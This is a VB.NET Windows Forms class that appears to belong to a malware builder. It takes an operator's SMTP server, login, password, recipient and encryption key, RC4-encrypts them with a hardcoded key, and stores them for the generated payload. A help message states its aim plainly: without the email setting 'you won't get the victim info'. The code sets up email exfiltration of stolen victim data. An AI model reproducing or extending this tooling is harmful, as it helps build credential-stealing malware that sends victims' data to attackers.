Public Class Getinfmail

    Private Sub NyX_Button1_Click(sender As Object, e As EventArgs) Handles NyX_Button1.Click
        CrystalClearTextBox5.Text = Randome(50)
    End Sub

    Private Sub NyX_Button12_Click(sender As Object, e As EventArgs) Handles NyX_Button12.Click
        Form1.m_adresse = RC4Encrypt(CrystalClearTextBox1.Text, "2RbNE8EfLjepLENNXb4N")
        Form1.m_pwd = RC4Encrypt(CrystalClearTextBox2.Text, "2RbNE8EfLjepLENNXb4N")
        Form1.m_sendto = RC4Encrypt(CrystalClearTextBox3.Text, "2RbNE8EfLjepLENNXb4N")
        Form1.m_enc = NyX_CheckBox1.Checked
        Form1.m_key = RC4Encrypt(CrystalClearTextBox5.Text, "2RbNE8EfLjepLENNXb4N")
        Form1.smtp = RC4Encrypt(ComboBox1.Text, "2RbNE8EfLjepLENNXb4N")
        Form1.m_port = prt.Text
        Me.Hide()
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        With ComboBox1
            If .Text = "smtp.mail.ru" Then
                prt.Text = "465"
            End If
            If .Text = "mail.yahoo.fr" Then
                prt.Text = "465"
            End If
            If .Text = "outlook.office365.com" Then
                prt.Text = "587"
            End If
            If .Text = "outlook.office365.com" Then
                prt.Text = "587"
            End If

            If .Text = "smtp.gmail.com" Then
                prt.Text = "587"
            End If
            If .Text = "smtp.live.com" Then
                prt.Text = "465"
            End If
        End With


    End Sub

    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click
        MsgBox("To Decrypte mail content go to Tools>>Decryption", MsgBoxStyle.Information, "Info")
    End Sub

    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click
        MsgBox("don't forget to enable Allow less secure apps on your email provider or else you won't get the victim info !", MsgBoxStyle.Information, "Info")
    End Sub
End Class